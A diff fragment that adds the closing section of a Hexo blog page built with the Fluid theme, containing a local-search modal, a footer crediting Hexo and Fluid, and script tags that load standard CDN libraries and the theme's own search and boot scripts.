+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
